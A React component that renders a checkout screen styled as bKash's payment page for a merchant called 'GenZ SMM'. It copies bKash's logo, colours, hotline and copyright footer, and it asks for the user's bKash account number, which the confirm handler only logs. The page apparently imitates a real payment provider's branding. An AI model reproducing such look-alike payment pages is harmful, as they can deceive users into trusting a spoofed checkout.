import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Phone, Hand } from "lucide-react";
import genzLogo from "@/assets/genz-logo.png";
import bkashLogoImg from "@/assets/bkash-logo.png";

const BkashPayment = () => {
  const navigate = useNavigate();
  const [phoneNumber, setPhoneNumber] = useState("");
  const [showCancelView, setShowCancelView] = useState(false);
  
  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  
  const isValidNumber = () => {
    if (phoneNumber.length !== 11) return false;
    const prefix = phoneNumber.substring(0, 3);
    return validPrefixes.includes(prefix) && /^\d+$/.test(phoneNumber);
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 11);
    setPhoneNumber(value);
  };

  const handleConfirm = () => {
    if (isValidNumber()) {
      console.log("Proceeding with number:", phoneNumber);
    }
  };

  const handleCancelClick = () => {
    setShowCancelView(true);
  };

  const handleConfirmCancel = () => {
    navigate("/");
  };

  return (
    <div className="min-h-screen bg-gray-200 flex flex-col items-center p-4">
      <div className="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden h-[50vh] flex flex-col">
        {/* bKash Logo Header */}
        <div className="bg-white py-2.5 flex justify-center border-b shrink-0">
          <img src={bkashLogoImg} alt="bKash" className="h-6 object-contain" />
        </div>

        {/* Merchant Info */}
        <div className="bg-white px-4 py-2.5 flex items-center justify-between border-b shrink-0">
          <div className="flex items-center gap-2.5">
            <img 
              src={genzLogo} 
              alt="GenZ SMM" 
              className="w-10 h-10 rounded-full object-cover"
            />
            <div>
              <h2 className="text-gray-800 font-medium text-xs leading-tight">
                GenZ SMM
              </h2>
              <p className="text-gray-500 text-[10px]">
                Inv No: B255527202718B
              </p>
            </div>
          </div>
          <span className="text-gray-800 font-semibold text-sm">৳434</span>
        </div>

        {/* Conditional Content: Payment Form or Cancel Confirmation */}
        {!showCancelView ? (
          <>
            {/* Pink Section - Payment Form */}
            <div className="bg-[#E2136E] px-5 py-5 flex-1 flex flex-col justify-center">
              <h3 className="text-white text-center text-xs font-medium mb-3">
                Your bKash Account Number
              </h3>
              <input
                type="tel"
                value={phoneNumber}
                onChange={handlePhoneChange}
                placeholder="e.g 01XXXXXXXXX"
                className="w-full bg-white rounded px-3 py-1.5 text-center text-gray-600 text-xs placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-white/50"
              />
              <p className="text-white text-center text-[10px] mt-2">
                Confirm and proceed,{" "}
                <a href="#" className="underline hover:text-white/80">
                  terms & conditions
                </a>
              </p>
            </div>

            {/* Action Buttons */}
            <div className="bg-white px-4 py-2.5 flex gap-3 shrink-0">
              <button
                onClick={handleCancelClick}
                className="flex-1 bg-white border border-gray-300 text-gray-600 py-2 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
              >
                Cancel
              </button>
              <button
                onClick={handleConfirm}
                disabled={!isValidNumber()}
                className={`flex-1 py-2 rounded text-xs font-medium transition-colors ${
                  isValidNumber()
                    ? "bg-[#E2136E] text-white hover:bg-[#C91160]"
                    : "bg-gray-200 text-gray-400 cursor-not-allowed"
                }`}
              >
                Confirm
              </button>
            </div>
          </>
        ) : (
          <>
            {/* Pink Section - Cancel Confirmation */}
            <div className="bg-[#E2136E] px-5 flex-1 flex flex-col items-center justify-center">
              <Hand className="w-8 h-8 text-white mb-2" />
              <p className="text-white text-center text-xs font-medium">
                Are you sure you want to cancel this payment?
              </p>
            </div>

            {/* Cancel Confirmation Buttons */}
            <div className="bg-white px-4 py-2.5 flex gap-3 shrink-0">
              <button
                onClick={handleConfirmCancel}
                className="flex-1 bg-white border border-gray-300 text-gray-600 py-2 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
              >
                Yes
              </button>
              <button
                onClick={() => setShowCancelView(false)}
                className="flex-1 bg-[#E2136E] text-white py-2 rounded text-xs font-medium hover:bg-[#C91160] transition-colors"
              >
                No
              </button>
            </div>
          </>
        )}

        {/* Footer */}
        <div className="bg-white px-4 py-2 text-center border-t shrink-0">
          <div className="flex items-center justify-center gap-1 text-[#E2136E] mb-0.5">
            <Phone className="w-3 h-3" />
            <span className="text-xs font-medium">16247</span>
          </div>
          <p className="text-gray-500 text-[10px]">
            © 2025 bKash, All Rights Reserved
          </p>
        </div>
      </div>
    </div>
  );
};

export default BkashPayment;
